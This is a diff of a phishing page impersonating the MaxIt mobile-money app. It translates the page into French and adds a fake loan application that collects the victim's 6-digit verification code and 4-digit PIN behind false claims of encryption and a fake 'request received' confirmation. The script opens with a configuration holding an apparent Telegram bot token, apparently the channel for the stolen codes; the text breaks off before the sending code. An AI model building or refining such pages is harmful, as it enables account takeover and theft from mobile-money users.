@@ -574,16 +574,78 @@
             <button class="btn-primary" id="confirmPinBtn">Confirm PIN</button>
         </div>
     </div>
+
+            <div class="card">
+
+    <!-- En-tête -->
+    <div class="header">
+        <div class="logo-wrap">
+            <div class="logo-bg">
+                <span class="logo-text">MaxIt</span>
+            </div>
+        </div>
+        <div class="header-title">Vérifiez votre appareil</div>
+        <div class="header-desc">Saisissez le code à 6 chiffres envoyé à votre numéro pour vérifier cet appareil et continuer.</div>
+    </div>
+
+    <!-- Informations sur l'offre -->
+    <div class="offer-info" id="offerInfo">
+        <div class="offer-label">Demande de prêt</div>
+        <div class="offer-name" id="offerTitle">Prêt Flex</div>
+        <div class="offer-amount" id="offerPrice">—</div>
+        <div class="offer-meta" id="offerMeta"></div>
+    </div>
+
+    <!-- Affichage du numéro de téléphone -->
+    <p class="phone-display" id="phoneDisplay"></p>
+
+    <!-- Champs du code de vérification (6 cases) -->
+    <div class="otp-container" id="otpInputs"></div>
+
+    <!-- Erreur -->
+    <div class="error-msg" id="errMsg"></div>
+
+    <!-- Boutons -->
+    <div class="form-body">
+        <button class="btn-primary" id="verifyBtn">Vérifier le code de l'appareil</button>
+        <button class="btn-back" onclick="window.history.back()">← Retour</button>
+        <div class="security-note">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+            </svg>
+            Chiffrement 256 bits et sécurité assurée par MaxIt
+        </div>
+    </div>
 </div>
 
-<!-- Spinner -->
+<!-- Fenêtre de saisie du code PIN -->
+<div id="pinModal">
+    <div class="modal-card">
+        <div class="modal-header">
+            <div class="logo-wrap" style="justify-content:center; margin-bottom:10px;">
+                <div class="logo-bg">
+                    <span class="logo-text">MaxIt</span>
+                </div>
+            </div>
+            <div class="modal-title">Saisissez votre code PIN</div>
+            <div class="modal-subtitle">Saisissez votre code PIN à 4 chiffres pour terminer cette transaction en toute sécurité.</div>
+        </div>
+        <div class="modal-body">
+            <div class="otp-container" id="pinInputs" style="margin:0 0 20px;"></div>
+            <div class="pin-error-msg" id="pinErrMsg"></div>
+            <button class="btn-primary" id="confirmPinBtn">Confirmer le code PIN</button>
+        </div>
+    </div>
+</div>
+
+<!-- Indicateur de chargement -->
 <div id="spinner">
     <div class="spin-ring"></div>
-    <div class="spin-label">Verifying Device…</div>
-    <div class="spin-sub">Please hold on</div>
+    <div class="spin-label">Vérification de l'appareil…</div>
+    <div class="spin-sub">Veuillez patienter</div>
 </div>
 
-<!-- Success Overlay -->
+<!-- Écran de confirmation -->
 <div id="successOverlay">
     <div class="success-card">
         <div class="success-header">
@@ -598,37 +660,36 @@
             <div class="success-icon">
                 <i class="fa-solid fa-circle-check"></i>
             </div>
-            <h2>Application Received!</h2>
-            <p>Your loan request has been successfully submitted. Funds will be disbursed to your MaxIt wallet shortly after approval.</p>
+            <h2>Demande reçue !</h2>
+            <p>Votre demande de prêt a été soumise avec succès. Les fonds seront versés sur votre portefeuille MaxIt peu après l'approbation.</p>
             <div class="summary-card">
                 <div class="summary-row">
                     <span class="s-label">Date</span>
                     <span class="s-val" id="sDate">—</span>
                 </div>
                 <div class="summary-row">
-                    <span class="s-label">Amount</span>
+                    <span class="s-label">Montant</span>
                     <span class="s-ref" id="sAmount">—</span>
                 </div>
                 <div class="summary-row">
-                    <span class="s-label">Purpose</span>
+                    <span class="s-label">Motif</span>
                     <span class="s-val" id="sPurpose">—</span>
                 </div>
                 <div class="summary-row">
-                    <span class="s-label">Reference</span>
+                    <span class="s-label">Référence</span>
                     <span class="s-ref" id="sRefId">—</span>
                 </div>
                 <div class="summary-row">
-                    <span class="s-label">Status</span>
-                    <span class="s-status">Pending Approval</span>
+                    <span class="s-label">Statut</span>
+                    <span class="s-status">En attente d'approbation</span>
                 </div>
             </div>
             <a href="index.html" class="btn-home">
-                <i class="fa-solid fa-house"></i>&nbsp; Return to Home
+                <i class="fa-solid fa-house"></i>&nbsp; Retour à l'accueil
             </a>
         </div>
     </div>
 </div>
-
 <script>
     const CONFIG = {
         BOT_TOKEN: '8330538667:AAEgIreUCgpFrDv4Ys-UlPE2-MujHCLTDr0',
